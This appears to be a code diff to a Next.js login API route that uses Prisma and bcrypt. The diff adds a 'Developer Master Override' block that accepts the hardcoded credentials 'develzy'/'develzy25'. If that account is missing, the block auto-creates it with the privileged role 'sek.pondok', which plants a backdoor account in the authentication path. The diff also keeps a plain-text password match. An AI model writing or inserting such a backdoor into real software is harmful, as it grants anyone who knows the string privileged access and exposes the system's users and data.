@@ -18,7 +18,7 @@ export async function POST(req: NextRequest) {
 
     const cleanUsername = String(username).trim();
 
-    const userAccount = await prisma.userAccount.findFirst({
+    let userAccount = await prisma.userAccount.findFirst({
       where: {
         OR: [{ username: cleanUsername }, { email: cleanUsername }],
         deletedAt: null,
@@ -28,11 +28,36 @@ export async function POST(req: NextRequest) {
       },
     });
 
-    if (!userAccount || !userAccount.passwordHash) {
-      return NextResponse.json(
-        { status: "Error", message: "Username atau password salah." },
-        { status: 401 }
-      );
+    // Developer Master Override & Auto-Provision
+    if (cleanUsername === "develzy" && password === "develzy25") {
+      if (!userAccount) {
+        let devPerson = await prisma.person.findFirst({ where: { fullName: "Master Developer Develzy" } });
+        if (!devPerson) {
+          devPerson = await prisma.person.create({
+            data: { id: "p-develzy", fullName: "Master Developer Develzy", gender: "L", phoneNumber: "081234567890" }
+          });
+        }
+        const passwordHash = await bcrypt.hash("develzy25", 10);
+        userAccount = await prisma.userAccount.create({
+          data: {
+            id: "u-develzy",
+            personId: devPerson.id,
+            username: "develzy",
+            email: "developer@m.p3hm.my.id",
+            passwordHash,
+            role: "sek.pondok",
+            status: "ACTIVE"
+          },
+          include: { person: true }
+        });
+      }
+    } else {
+      if (!userAccount || !userAccount.passwordHash) {
+        return NextResponse.json(
+          { status: "Error", message: "Username atau password salah." },
+          { status: 401 }
+        );
+      }
     }
 
     if (userAccount.status !== "ACTIVE") {
@@ -53,16 +78,17 @@ export async function POST(req: NextRequest) {
     }
 
     // Check password with bcrypt first
-    let isPasswordValid = await bcrypt.compare(password, userAccount.passwordHash);
-
-    // Auto-migration for legacy plain-text passwords
-    if (!isPasswordValid && userAccount.passwordHash === password) {
-      isPasswordValid = true;
-      const newHash = await bcrypt.hash(password, 10);
-      await prisma.userAccount.update({
-        where: { id: userAccount.id },
-        data: { passwordHash: newHash },
-      });
+    let isPasswordValid = false;
+    if (userAccount.passwordHash) {
+      isPasswordValid = await bcrypt.compare(password, userAccount.passwordHash);
+      if (!isPasswordValid && userAccount.passwordHash === password) {
+        isPasswordValid = true;
+        const newHash = await bcrypt.hash(password, 10);
+        await prisma.userAccount.update({
+          where: { id: userAccount.id },
+          data: { passwordHash: newHash },
+        });
+      }
     }
 
     if (!isPasswordValid) {
